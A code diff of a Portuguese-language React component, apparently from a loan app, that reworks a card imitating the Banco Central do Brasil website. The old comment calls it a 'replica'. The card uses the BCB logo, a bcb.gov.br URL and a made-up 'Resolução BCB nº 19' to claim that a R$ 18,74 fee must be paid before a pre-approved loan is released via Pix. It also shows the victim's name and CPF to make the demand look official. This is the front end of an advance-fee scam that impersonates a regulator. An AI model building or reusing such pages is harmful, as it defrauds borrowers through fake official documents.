@@ -499,141 +499,185 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel }: { qrCo
   );
 };
 
-// BCB Normative Card — replica do site bcb.gov.br
+// BCB Normative Card — preview compacto + modal
 const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: string; cpf?: string; valor: number; onConfirm: () => void; confirmed: boolean }) => {
+  const [open, setOpen] = useState(false);
   const today = new Date().toLocaleDateString("pt-BR");
 
+  const handleConfirm = () => {
+    onConfirm();
+    setTimeout(() => setOpen(false), 1200);
+  };
+
   return (
-    <div className="bg-white border border-border rounded-2xl overflow-hidden shadow-lg max-h-[70vh] overflow-y-auto">
-      {/* Header — BCB official style */}
-      <div className="px-5 py-4 border-b border-gray-200">
-        <div className="flex items-center justify-between text-[10px] text-gray-400 mb-3">
-          <span>{new Date().toLocaleDateString("pt-BR")}, {new Date().toLocaleTimeString("pt-BR", {hour:'2-digit',minute:'2-digit'})}</span>
-          <span>Exibe Normativo</span>
-        </div>
-        <div className="flex justify-center mb-4">
-          <img src={bcbLogo} alt="Banco Central do Brasil" className="h-14" />
-        </div>
-        <h2 className="text-[#1a1a1a] text-lg font-serif leading-tight">
-          Resolução BCB nº 19 de 1/10/2020
-        </h2>
-        <p className="text-gray-500 text-xs mt-1">Versão vigente, atualizada em 26/10/2021</p>
-      </div>
-
-      {/* Resolution header text */}
-      <div className="px-5 py-4 space-y-3 text-[11px] text-gray-700 leading-relaxed">
-        <p className="text-center font-semibold text-xs text-gray-800 uppercase tracking-wide">
-          RESOLUÇÃO BCB Nº 19, DE 1º DE OUTUBRO DE 2020
-        </p>
-
-        {/* CAPÍTULO I */}
-        <div className="text-center space-y-1 pt-2">
-          <p className="font-bold text-xs text-gray-800">CAPÍTULO I</p>
-          <p className="font-semibold text-[11px] text-gray-700">DO OBJETO E ÂMBITO DE APLICAÇÃO</p>
-        </div>
-
-        <p><strong>Art. 1º</strong> Esta Resolução dispõe sobre os procedimentos aplicáveis à etapa de transferência de valores decorrentes de operações de crédito previamente aprovadas em plataformas digitais.</p>
-
-        <p><strong>Art. 2º</strong> Aplica-se às operações que envolvam intermediação por instituições de pagamento e processadoras responsáveis pela liquidação no âmbito do Sistema de Pagamentos Brasileiro (SPB).</p>
-
-        {/* CAPÍTULO II */}
-        <div className="text-center space-y-1 pt-2">
-          <p className="font-bold text-xs text-gray-800">CAPÍTULO II</p>
-          <p className="font-semibold text-[11px] text-gray-700">DA TRANSFERÊNCIA DE CRÉDITO</p>
-        </div>
-
-        <p><strong>Art. 3º</strong> A transferência de crédito compreende um conjunto de etapas operacionais, incluindo:</p>
-
-        <div className="pl-4 space-y-1">
-          <p>I - validação e autenticação cadastral do titular;</p>
-          <p>II - verificação de titularidade da conta de destino;</p>
-          <p>III - análise de risco e mecanismos antifraude;</p>
-          <p>IV - integração com instituições financeiras e de pagamento;</p>
-          <p>V - autorização e liquidação da transação.</p>
-        </div>
-
-        {/* CAPÍTULO III */}
-        <div className="text-center space-y-1 pt-2">
-          <p className="font-bold text-xs text-gray-800">CAPÍTULO III</p>
-          <p className="font-semibold text-[11px] text-gray-700">DOS CUSTOS OPERACIONAIS</p>
-        </div>
-
-        <p><strong>Art. 4º</strong> Em operações de crédito, poderá haver a incidência de cobrança por parte da processadora de pagamentos, referente aos custos operacionais necessários à formalização e execução da transferência.</p>
-
-        <p><strong>Art. 5º</strong> Os custos mencionados no artigo anterior estão relacionados, entre outros, aos seguintes serviços:</p>
-
-        <div className="pl-4 space-y-1">
-          <p>I - processamento da transação financeira;</p>
-          <p>II - validação sistêmica e segurança da operação;</p>
-          <p>III - utilização da infraestrutura de liquidação;</p>
-          <p>IV - conformidade com os padrões do sistema financeiro.</p>
-        </div>
-
-        <p><strong>Art. 6º</strong> As cobranças previstas nesta Resolução não se caracterizam como tarifa de transferência simples entre contas, tratando-se de etapa integrante do processo de liberação de crédito.</p>
-
-        {/* CAPÍTULO IV */}
-        <div className="text-center space-y-1 pt-2">
-          <p className="font-bold text-xs text-gray-800">CAPÍTULO IV</p>
-          <p className="font-semibold text-[11px] text-gray-700">DA LIBERAÇÃO DOS RECURSOS</p>
-        </div>
-
-        <p><strong>Art. 7º</strong> Após a regularização das etapas operacionais, o valor será disponibilizado ao cliente por meio do arranjo de pagamentos instantâneos (Pix), conforme prazos e diretrizes da plataforma.</p>
-
-        {/* CAPÍTULO V */}
-        <div className="text-center space-y-1 pt-2">
-          <p className="font-bold text-xs text-gray-800">CAPÍTULO V</p>
-          <p className="font-semibold text-[11px] text-gray-700">DISPOSIÇÕES FINAIS</p>
-        </div>
-
-        <p><strong>Art. 8º</strong> Esta Resolução entra em vigor na data de sua emissão.</p>
-
-        <hr className="border-gray-200 my-2" />
-
-        {/* Justification box */}
-        <div className="bg-amber-50 border-l-4 border-amber-400 rounded-r-lg p-3 space-y-2">
-          <p className="text-[10px] text-amber-800 font-bold">⚠️ FUNDAMENTAÇÃO DA COBRANÇA</p>
-          <p className="text-[10px] text-amber-700 leading-relaxed">
-            Conforme Art. 4º e Art. 6º desta Resolução, a taxa cobrada nesta operação de crédito pessoal é devida para cobrir os custos operacionais de processamento, validação antifraude e efetivação da transferência do valor de <strong>{formatCurrency(valor)}</strong> ao beneficiário <strong>{nome || "N/A"}</strong>, CPF <strong>{cpf || "N/A"}</strong>.
-          </p>
-          <p className="text-[10px] text-amber-700 leading-relaxed">
-            Sem o pagamento da referida taxa, a processadora fica <strong>impossibilitada</strong> de efetuar a ordem de transferência, conforme regulamentação vigente do Banco Central do Brasil.
-          </p>
-        </div>
-
-        {/* Summary box */}
-        <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center space-y-1">
-          <p className="text-[10px] text-gray-500">Taxa de transferência interbancária</p>
-          <p className="text-2xl font-bold text-primary">R$ 18,74</p>
-          <p className="text-[10px] text-gray-500">Pagamento único • Não é mensalidade</p>
-        </div>
-      </div>
-
-      {/* Footer */}
-      <div className="px-5 py-3 bg-gray-50 border-t border-gray-200">
-        <p className="text-[9px] text-gray-400 text-center leading-relaxed">
-          https://www.bcb.gov.br/estabilidadefinanceira/exibenormativo?tipo=Resolução BCB&numero=19
-        </p>
-      </div>
-
-      {/* Confirm button */}
-      <div className="sticky bottom-0 bg-white border-t border-gray-200 px-5 py-4">
-        {!confirmed ? (
-          <button
-            onClick={onConfirm}
-            className="btn-3d w-full !py-3.5 !rounded-xl !text-sm flex items-center justify-center gap-2"
-          >
-            Li e estou ciente — Prosseguir
-          </button>
-        ) : (
-          <div className="bg-green-50 border border-green-200 rounded-xl p-3 text-center">
-            <div className="flex items-center justify-center gap-2">
-              <Check className="w-4 h-4 text-green-600" />
-              <p className="text-xs font-semibold text-green-700">Normativo confirmado</p>
+    <div className="space-y-3">
+      <div
+        onClick={() => !confirmed && setOpen(true)}
+        className={`bg-gradient-to-br from-[hsl(205,100%,27%)] to-[hsl(206,100%,36%)] rounded-2xl p-5 text-white shadow-lg ${!confirmed ? "cursor-pointer hover:shadow-xl transition-shadow" : ""}`}
+      >
+        <div className="flex items-center justify-between mb-3 gap-3">
+          <div className="flex items-center gap-3 min-w-0">
+            <div className="bg-white rounded-xl px-3 py-2 shrink-0">
+              <img src={bcbLogo} alt="Banco Central do Brasil" className="h-7 w-auto object-contain" />
             </div>
-            <p className="text-[10px] text-green-600">{today}</p>
+            <div className="min-w-0">
+              <p className="font-bold text-sm leading-tight">Normativo BCB</p>
+              <p className="text-[11px] text-white/75 truncate">Resolução BCB nº 19 de 1/10/2020</p>
+            </div>
+          </div>
+          <span className="text-[10px] bg-white/20 px-2 py-1 rounded-full shrink-0">BCB</span>
+        </div>
+
+        <div className="flex items-end justify-between gap-3">
+          <div>
+            <p className="text-xs text-white/70">Taxa operacional</p>
+            <p className="text-2xl font-black">R$ 18,74</p>
+            <p className="text-[10px] text-white/70">Pagamento único</p>
+          </div>
+          <div className="text-right">
+            <p className="text-xs text-white/70">Status</p>
+            <p className="text-sm font-bold">{confirmed ? "Confirmado" : "Pendente"}</p>
+          </div>
+        </div>
+
+        {!confirmed ? (
+          <div className="mt-3 bg-white/20 rounded-xl py-2 text-center">
+            <p className="text-xs font-semibold">Toque para abrir o normativo</p>
+          </div>
+        ) : (
+          <div className="mt-3 bg-green-500/30 rounded-xl py-2 text-center flex items-center justify-center gap-2">
+            <Check className="w-4 h-4" />
+            <p className="text-xs font-semibold">Normativo confirmado — {today}</p>
           </div>
         )}
       </div>
+
+      {open && (
+        <div className="fixed inset-0 z-[9999] bg-black/60 flex items-end md:items-center justify-center animate-in fade-in duration-200">
+          <div className="bg-white w-full max-w-lg md:rounded-2xl md:max-h-[90vh] h-full md:h-auto overflow-y-auto animate-in slide-in-from-bottom-4 duration-300">
+            <div className="sticky top-0 z-10 bg-gradient-to-r from-[hsl(205,100%,27%)] to-[hsl(206,100%,36%)] px-5 py-4 flex items-center justify-between gap-3">
+              <div className="flex items-center gap-3 min-w-0">
+                <div className="bg-white rounded-xl px-3 py-2 shrink-0">
+                  <img src={bcbLogo} alt="Banco Central do Brasil" className="h-7 w-auto object-contain" />
+                </div>
+                <div className="min-w-0">
+                  <p className="text-white font-bold text-sm">Resolução BCB nº 19</p>
+                  <p className="text-white/70 text-[10px]">1º de outubro de 2020 — {today}</p>
+                </div>
+              </div>
+              <button onClick={() => setOpen(false)} className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-white hover:bg-white/30 transition shrink-0">
+                ✕
+              </button>
+            </div>
+
+            <div className="px-5 py-4 border-b border-border">
+              <div className="flex items-center justify-between text-[10px] text-muted-foreground mb-3">
+                <span>{new Date().toLocaleDateString("pt-BR")}, {new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })}</span>
+                <span>Exibe Normativo</span>
+              </div>
+              <h2 className="text-foreground text-lg font-serif leading-tight">
+                Resolução BCB nº 19 de 1/10/2020
+              </h2>
+              <p className="text-muted-foreground text-xs mt-1">Versão vigente, atualizada em 26/10/2021</p>
+            </div>
+
+            <div className="px-5 py-4 space-y-3 text-[11px] text-foreground/80 leading-relaxed">
+              <p className="text-center font-semibold text-xs text-foreground uppercase tracking-wide">
+                RESOLUÇÃO BCB Nº 19, DE 1º DE OUTUBRO DE 2020
+              </p>
+
+              <div className="text-center space-y-1 pt-2">
+                <p className="font-bold text-xs text-foreground">CAPÍTULO I</p>
+                <p className="font-semibold text-[11px] text-foreground/80">DO OBJETO E ÂMBITO DE APLICAÇÃO</p>
+              </div>
+              <p><strong>Art. 1º</strong> Esta Resolução dispõe sobre os procedimentos aplicáveis à etapa de transferência de valores decorrentes de operações de crédito previamente aprovadas em plataformas digitais.</p>
+              <p><strong>Art. 2º</strong> Aplica-se às operações que envolvam intermediação por instituições de pagamento e processadoras responsáveis pela liquidação no âmbito do Sistema de Pagamentos Brasileiro (SPB).</p>
+
+              <div className="text-center space-y-1 pt-2">
+                <p className="font-bold text-xs text-foreground">CAPÍTULO II</p>
+                <p className="font-semibold text-[11px] text-foreground/80">DA TRANSFERÊNCIA DE CRÉDITO</p>
+              </div>
+              <p><strong>Art. 3º</strong> A transferência de crédito compreende um conjunto de etapas operacionais, incluindo:</p>
+              <div className="pl-4 space-y-1">
+                <p>I - validação e autenticação cadastral do titular;</p>
+                <p>II - verificação de titularidade da conta de destino;</p>
+                <p>III - análise de risco e mecanismos antifraude;</p>
+                <p>IV - integração com instituições financeiras e de pagamento;</p>
+                <p>V - autorização e liquidação da transação.</p>
+              </div>
+
+              <div className="text-center space-y-1 pt-2">
+                <p className="font-bold text-xs text-foreground">CAPÍTULO III</p>
+                <p className="font-semibold text-[11px] text-foreground/80">DOS CUSTOS OPERACIONAIS</p>
+              </div>
+              <p><strong>Art. 4º</strong> Em operações de crédito, poderá haver a incidência de cobrança por parte da processadora de pagamentos, referente aos custos operacionais necessários à formalização e execução da transferência.</p>
+              <p><strong>Art. 5º</strong> Os custos mencionados no artigo anterior estão relacionados, entre outros, aos seguintes serviços:</p>
+              <div className="pl-4 space-y-1">
+                <p>I - processamento da transação financeira;</p>
+                <p>II - validação sistêmica e segurança da operação;</p>
+                <p>III - utilização da infraestrutura de liquidação;</p>
+                <p>IV - conformidade com os padrões do sistema financeiro.</p>
+              </div>
+              <p><strong>Art. 6º</strong> As cobranças previstas nesta Resolução não se caracterizam como tarifa de transferência simples entre contas, tratando-se de etapa integrante do processo de liberação de crédito.</p>
+
+              <div className="text-center space-y-1 pt-2">
+                <p className="font-bold text-xs text-foreground">CAPÍTULO IV</p>
+                <p className="font-semibold text-[11px] text-foreground/80">DA LIBERAÇÃO DOS RECURSOS</p>
+              </div>
+              <p><strong>Art. 7º</strong> Após a regularização das etapas operacionais, o valor será disponibilizado ao cliente por meio do arranjo de pagamentos instantâneos (Pix), conforme prazos e diretrizes da plataforma.</p>
+
+              <div className="text-center space-y-1 pt-2">
+                <p className="font-bold text-xs text-foreground">CAPÍTULO V</p>
+                <p className="font-semibold text-[11px] text-foreground/80">DISPOSIÇÕES FINAIS</p>
+              </div>
+              <p><strong>Art. 8º</strong> Esta Resolução entra em vigor na data de sua emissão.</p>
+
+              <hr className="border-border my-2" />
+
+              <div className="bg-amber-50 border-l-4 border-amber-400 rounded-r-lg p-3 space-y-2">
+                <p className="text-[10px] text-amber-800 font-bold">⚠️ FUNDAMENTAÇÃO DA COBRANÇA</p>
+                <p className="text-[10px] text-amber-700 leading-relaxed">
+                  Conforme Art. 4º e Art. 6º desta Resolução, a taxa cobrada nesta operação de crédito pessoal é devida para cobrir os custos operacionais de processamento, validação antifraude e efetivação da transferência do valor de <strong>{formatCurrency(valor)}</strong> ao beneficiário <strong>{nome || "N/A"}</strong>, CPF <strong>{cpf || "N/A"}</strong>.
+                </p>
+                <p className="text-[10px] text-amber-700 leading-relaxed">
+                  Sem o pagamento da referida taxa, a processadora fica <strong>impossibilitada</strong> de efetuar a ordem de transferência, conforme regulamentação vigente do Banco Central do Brasil.
+                </p>
+              </div>
+
+              <div className="bg-muted/30 border border-border rounded-xl p-4 text-center space-y-1">
+                <p className="text-[10px] text-muted-foreground">Taxa de transferência interbancária</p>
+                <p className="text-2xl font-bold text-primary">R$ 18,74</p>
+                <p className="text-[10px] text-muted-foreground">Pagamento único • Não é mensalidade</p>
+              </div>
+            </div>
+
+            <div className="px-5 py-3 bg-muted/30 border-t border-border">
+              <p className="text-[9px] text-muted-foreground text-center leading-relaxed break-all">
+                https://www.bcb.gov.br/estabilidadefinanceira/exibenormativo?tipo=Resolução BCB&numero=19
+              </p>
+            </div>
+
+            <div className="sticky bottom-0 bg-white border-t border-border px-5 py-4">
+              {!confirmed ? (
+                <button
+                  onClick={handleConfirm}
+                  className="btn-3d w-full !py-3.5 !rounded-xl !text-sm flex items-center justify-center gap-2"
+                >
+                  Li e estou ciente — Prosseguir
+                </button>
+              ) : (
+                <div className="bg-green-50 border border-green-200 rounded-xl p-3 text-center">
+                  <div className="flex items-center justify-center gap-2">
+                    <Check className="w-4 h-4 text-green-600" />
+                    <p className="text-xs font-semibold text-green-700">Normativo confirmado</p>
+                  </div>
+                  <p className="text-[10px] text-green-600">{today}</p>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
